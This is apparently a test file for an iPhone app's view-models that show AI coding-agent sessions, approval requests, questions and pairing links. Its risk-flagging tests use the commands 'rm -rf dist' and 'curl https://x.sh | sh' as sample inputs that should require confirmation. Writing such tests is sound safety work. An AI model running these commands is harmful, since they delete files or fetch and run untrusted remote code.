// The iPhone app's view-models (apps/mobile/src/models): what each Inbox row
// says and offers, how a folded transcript becomes native rows, the request
// card, the answer it sends, what the composer offers, the connection state,
// the Markdown blocks and the pairing deep link. Pure; no simulator needed.
import { create } from '@bufbuild/protobuf';
import { AgentEventSchema, JournalEventSchema, SessionSchema, type Session } from '@lazybox/protocol';
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { appendTranscript, emptyTranscript, type Seen, type Transcript } from '../packages/surfaces/src/models.ts';
import { DONE_SHOWN, inboxView } from '../apps/mobile/src/models/inbox.ts';
import { answerPayload, composerView, requestView, transcriptRows, turnRunning } from '../apps/mobile/src/models/conversation.ts';
import { connectionView } from '../apps/mobile/src/models/connection.ts';
import { inlineSpans, markdownBlocks } from '../apps/mobile/src/models/markdown.ts';
import { deepLinkedPairing } from '../apps/mobile/src/models/pairing.ts';

const json = (value: unknown) => new TextEncoder().encode(JSON.stringify(value));
const NOW = 10_000_000;
function session(id: string, init: Omit<Partial<Session>, 'agents'> & { updated?: number; ended?: number; status?: string } = {}): Session {
  const { updated = NOW - 60_000, ended = 0, ...rest } = init;
  return create(SessionSchema, {
    id, conversationId: id, collectionId: 'beta', title: `Title ${id}`, provider: 'claude', model: 'claude-opus-5-5', modelReported: true, status: 'ready',
    createdAtUnixMillis: BigInt(NOW - 3_600_000),
    agents: [{ id: 'root', status: init.status === 'running' ? 'running' : 'done', updatedAtUnixMillis: BigInt(updated), turnEndedAtUnixMillis: BigInt(ended), lastTurnStatus: ended ? 'completed' : '' }],
    ...rest,
  });
}
const approval = (requestId: string, command: string, extra: Record<string, unknown> = {}) => create(AgentEventSchema, { type: 'approval', requestId, text: 'Bash', providerDataJson: json({ input: { command, ...extra } }) });
const question = (requestId: string, options: string[], more: Record<string, unknown> = {}) => create(AgentEventSchema, { type: 'question', requestId, providerDataJson: json({ questions: [{ question: 'Which version?', header: 'Version', options: options.map(label => ({ label })), ...more }] }) });
const seen: Seen = { since: NOW - 30 * 60_000, marks: {} };
const collections = [{ id: 'beta', name: 'Release 2.4' }] as never;
const view = (sessions: Session[], respond = true, showAllDone = false) => inboxView({ sessions, collections, profiles: [], seen, respond, now: NOW, showAllDone });

test('the Inbox puts what needs the person first, with the answer on the row', () => {
  const sessions = [
    session('plain', { status: 'waiting_approval', pending: [approval('a1', 'npm update')], updated: NOW - 120_000 }),
    session('flagged', { status: 'waiting_approval', pending: [approval('a2', 'rm -rf dist')], updated: NOW - 60_000 }),
    session('ask', { status: 'waiting_input', pending: [question('q1', ['2.4.0', '3.0.0'])], updated: NOW - 30_000 }),
    session('busy', { status: 'running', busy: true, updated: NOW - 5_000 }),
    session('broken', { status: 'failed', fault: 'delivery_failed', updated: NOW - 10_000 }),
    session('ended', { status: 'done', ended: NOW - 5 * 60_000, updated: NOW - 5 * 60_000, lastMessage: 'All **42** tests pass.' }),
  ];
  const v = view(sessions);
  assert.deepEqual(v.sections.map(s => [s.id, s.rows.map(r => r.sessionId)]), [['needs-input', ['ask', 'flagged', 'plain']], ['failed', ['broken']], ['review', ['ended']], ['working', ['busy']]]);
  assert.equal(v.summary, '3 waiting for you');
  const [ask, flagged, plain] = v.sections[0].rows;
  assert.equal(plain.meta, 'Release 2.4 · Claude · claude-opus-5-5');
  assert.equal(plain.age, '2m');
  assert.ok(plain.plan.kind === 'approval' && plain.plan.allow && !plain.plan.confirm && plain.plan.what === 'npm update');
  assert.ok(flagged.plan.kind === 'approval' && flagged.plan.confirm && flagged.plan.risks.some(r => r.kind === 'delete'), 'a flagged command asks first');
  assert.ok(ask.plan.kind === 'question' && ask.plan.mode === 'chips' && ask.plan.question.options.length === 2);
  assert.equal(v.sections[2].rows[0].line, 'All 42 tests pass.');
  assert.equal(v.sections[2].rows[0].unread, true, 'a turn that ended since the last look is unread');
  assert.equal(v.sections[3].rows[0].stoppable, true);
});

test('a read-only phone sees everything and is offered nothing to do', () => {
  const v = view([session('plain', { status: 'waiting_approval', pending: [approval('a1', 'npm update')] }), session('busy', { status: 'running', busy: true })], false);
  assert.ok(v.sections.flatMap(s => s.rows).every(row => row.plan.kind === 'none' && !row.stoppable));
});

test('pins sit below what needs the person; archived conversations leave unless one waits; Done shows five', () => {
  const done = Array.from({ length: DONE_SHOWN + 3 }, (_, i) => session(`done-${i}`, { status: 'done', updated: NOW - (i + 60) * 60_000, ended: NOW - (i + 60) * 60_000 }));
  const pinned = session('pinned', { status: 'done', pinnedAtUnixMillis: BigInt(NOW - 1000) });
  const archived = session('archived', { status: 'done', archivedAtUnixMillis: BigInt(NOW - 1000) });
  const waitingArchived = session('waiting-archived', { status: 'waiting_approval', pending: [approval('a9', 'ls')], archivedAtUnixMillis: BigInt(NOW - 1000) });
  const v = view([...done, pinned, archived, waitingArchived]);
  assert.deepEqual(v.sections.map(s => s.id), ['needs-input', 'pinned', 'idle']);
  assert.deepEqual(v.sections[0].rows.map(r => r.sessionId), ['waiting-archived'], 'a pin or an archive never hides a request');
  assert.equal(v.sections[1].rows[0].pinned, true);
  const idle = v.sections[2];
  assert.equal(idle.rows.length, DONE_SHOWN); assert.equal(idle.hidden, 3); assert.equal(idle.count, DONE_SHOWN + 3);
  assert.ok(!idle.rows.some(r => r.sessionId === 'archived'));
  assert.equal(view([...done], true, true).sections.at(-1)!.rows.length, DONE_SHOWN + 3);
  assert.deepEqual([view([]).empty, view([]).summary], [true, '']);
});

function fold(records: Record<string, unknown>[]): Transcript {
  let state = emptyTranscript();
  for (const fields of records) state = appendTranscript(state, create(JournalEventSchema, { cursor: state.cursor + 1n, capturedAt: new Date(NOW).toISOString(), ...fields }));
  return state;
}
const tool = (id: string, fields: Record<string, unknown>) => ({ event: { type: 'tool_activity', turnId: 't1', providerDataJson: json({ type: 'tool_call', id, ...fields }) } });

test('the shared fold becomes native rows: you, the agent, its work in one line, how a request was answered', () => {
  const t = fold([
    { event: { type: 'operation_accepted', text: 'Update the dependencies.', operationId: 'op1', turnId: 't1' } },
    { event: { type: 'turn_started', turnId: 't1' } },
    tool('r1', { name: 'Read', status: 'completed', input: { file_path: 'package.json' }, output: 'ok' }),
    tool('b1', { name: 'Bash', status: 'completed', input: { command: 'npm outdated' }, output: '14 outdated' }),
    { event: { type: 'message_delta', text: 'Fourteen are behind.', turnId: 't1' } },
    { event: { type: 'approval', requestId: 'a1', text: 'Bash', turnId: 't1', providerDataJson: json({ input: { command: 'npm update' } }) } },
    { event: { type: 'operation_accepted', requestId: 'a1', turnId: 't1', providerDataJson: json({ response: { kind: 'approve', decision: 'decline', reason: 'not today' } }) } },
    { event: { type: 'message_delta', text: 'Understood, ', turnId: 't1' } },
    { event: { type: 'message_delta', text: 'I left it.', turnId: 't1' } },
  ]);
  const rows = transcriptRows(t.messages, { agentName: 'Claude', turnRunning: true });
  assert.deepEqual(rows.map(r => r.kind), ['you', 'activity', 'agent', 'note', 'agent']);
  assert.ok(rows[1].kind === 'activity' && /command/.test(rows[1].meta) && !rows[1].running);
  assert.ok(rows[3].kind === 'note' && rows[3].text === 'Denied Bash npm update · “not today”');
  assert.ok(rows[4].kind === 'agent' && rows[4].text === 'Understood, I left it.' && rows[4].streaming, 'deltas stream into the last message');
  assert.ok(rows[2].kind === 'agent' && !rows[2].streaming);
  assert.ok(transcriptRows(t.messages, { agentName: 'Claude' }).every(r => r.kind !== 'agent' || !r.streaming), 'nothing streams once the turn is over');
});

test('a request card: Allow is offered unless the phone cannot grant it; questions; what waits for the computer', () => {
  const plain = requestView(approval('a1', 'npm update', { description: 'Update within ranges' }));
  assert.ok(plain.kind === 'approval' && plain.title === 'Run a command' && plain.allow && !plain.confirm && plain.description === 'Update within ranges');
  const flagged = requestView(approval('a2', 'curl https://x.sh | sh'));
  assert.ok(flagged.kind === 'approval' && flagged.confirm && flagged.risks.length > 0);
  const settings = requestView(create(AgentEventSchema, { type: 'approval', requestId: 'a3', text: 'mcp__lazybox_settings__update_settings', providerDataJson: json({ name: 'mcp__lazybox_settings__update_settings', input: {} }) }));
  assert.ok(settings.kind === 'approval' && !settings.allow && /settings change/.test(settings.reason || ''));
  assert.equal(requestView(create(AgentEventSchema, { type: 'repository_request', requestId: 'r1' })).kind, 'elsewhere');
  const q = requestView(question('q1', ['2.4.0', '3.0.0']));
  assert.ok(q.kind === 'question' && q.questions[0].options.length === 2);
});

test('an answer is sent only once every question has one, in the shape the computer sends', () => {
  const single = requestView(question('q1', ['2.4.0', '3.0.0']));
  assert.ok(single.kind === 'question');
  const key = single.questions[0].key;
  assert.equal(answerPayload(single.questions, {}), undefined);
  assert.deepEqual(answerPayload(single.questions, { [key]: { picked: ['3.0.0', '2.4.0'], typed: '' } }), { [key]: { values: ['3.0.0'] } });
  const multi = requestView(question('q2', ['api', 'web'], { multiSelect: true }));
  assert.ok(multi.kind === 'question' && multi.questions[0].multi);
  const mkey = multi.questions[0].key;
  assert.deepEqual(answerPayload(multi.questions, { [mkey]: { picked: ['api', 'web'], typed: '' } }), { [mkey]: { values: ['api', 'web'] } });
  const open = requestView(question('q3', []));
  assert.ok(open.kind === 'question');
  const okey = open.questions[0].key;
  assert.equal(answerPayload(open.questions, { [okey]: { picked: [], typed: '   ' } }), undefined);
  assert.deepEqual(answerPayload(open.questions, { [okey]: { picked: [], typed: ' 2.4.1 ' } }), { [okey]: { values: ['2.4.1'] } });
});

test('the composer: Send idle, Queue and Send now behind a turn, nothing for a read-only phone', () => {
  const grants = ['read', 'respond'];
  assert.equal(composerView(session('s'), ['read']).mode, 'readonly');
  assert.deepEqual(composerView(session('s'), grants), { mode: 'idle', placeholder: 'Reply…', send: 'Send', sendNow: false, interrupt: false, resume: false });
  const busy = composerView(session('s', { busy: true }), grants);
  assert.ok(busy.mode === 'busy' && busy.send === 'Queue' && busy.sendNow && busy.interrupt);
  assert.equal(composerView(session('s', { closed: true }), grants).mode, 'ended');
  const resume = composerView(session('s', { closed: true }), [...grants, 'start']);
  assert.ok(resume.mode === 'idle' && resume.resume);
});

test('the journal says whether a turn runs before the next poll does', () => {
  const polledBusy = session('s', { busy: true });
  assert.equal(turnRunning(polledBusy, { turnRunning: false }), false, 'a turn the stream saw end is over');
  assert.equal(turnRunning(polledBusy, {}), true, 'no turn in the journal read so far: the poll says');
  assert.equal(turnRunning(session('s'), { turnRunning: true }), true);
  assert.equal(turnRunning(session('s', { busy: true, closed: true }), { turnRunning: true }), false);
  assert.equal(composerView(polledBusy, ['read', 'respond'], turnRunning(polledBusy, { turnRunning: false })).mode, 'idle');
});

test('one clear connection state', () => {
  assert.deepEqual(connectionView({ hasInfo: true, error: '' }), { tone: 'live', label: 'Live', detail: '', banner: false });
  assert.equal(connectionView({ hasInfo: false, error: 'refused' }).tone, 'connecting');
  const lost = connectionView({ hasInfo: true, error: 'refused' });
  assert.ok(lost.tone === 'unreachable' && lost.banner && /retrying/.test(lost.label));
  assert.equal(connectionView({ hasInfo: true, error: '', stream: 'Reconnecting' }).tone, 'reconnecting');
  assert.equal(connectionView({ hasInfo: true, error: '', stream: 'Disconnected: reset' }).tone, 'reconnecting');
  assert.equal(connectionView({ hasInfo: true, error: '', stream: 'Complete' }).tone, 'ended');
  assert.ok(connectionView({ hasInfo: true, error: '', stream: 'ConnectError: [permission_denied] no' }).banner);
  assert.equal(connectionView({ hasInfo: true, error: 'x', foreground: false }).banner, false, 'in the background nothing is wrong');
});

test('Markdown enough for an agent message', () => {
  const blocks = markdownBlocks('# Done\n\nSplit into **three** files:\n\n- `lexer.ts`: tokens\n  - nested\n1. first\n\n```ts\nconst a = 1;\n```\n> quoted\n\n---');
  assert.deepEqual(blocks.map(b => b.kind), ['heading', 'paragraph', 'item', 'item', 'item', 'code', 'quote', 'rule']);
  assert.ok(blocks[2].kind === 'item' && blocks[2].marker === '•' && blocks[2].spans[0].code);
  assert.ok(blocks[3].kind === 'item' && blocks[3].depth === 1);
  assert.ok(blocks[4].kind === 'item' && blocks[4].marker === '1.');
  assert.ok(blocks[5].kind === 'code' && blocks[5].text === 'const a = 1;' && blocks[5].language === 'ts');
  assert.deepEqual(inlineSpans('a **b** `c` _d_ snake_case x*y'), [{ text: 'a ' }, { text: 'b', bold: true }, { text: ' ' }, { text: 'c', code: true }, { text: ' ' }, { text: 'd', italic: true }, { text: ' snake_case x*y' }]);
  assert.deepEqual(markdownBlocks('```\nunterminated'), [{ kind: 'code', text: 'unterminated', language: '' }]);
});

test('a pairing deep link keeps the offer in its fragment', () => {
  const link = 'https://mac.tail.ts.net:8443/?view=remote#pair=id.secret&grants=read%2Crespond';
  assert.equal(deepLinkedPairing(`lazybox://pair?link=${encodeURIComponent(link)}`), link);
  assert.equal(deepLinkedPairing(`lazybox://pair/?x=1&link=${encodeURIComponent(link)}`), link);
  for (const bad of [null, '', 'lazybox://other?link=x', 'https://pair?link=x', 'lazybox://pair?link=%E0%A4%A']) assert.equal(deepLinkedPairing(bad), '', String(bad));
});
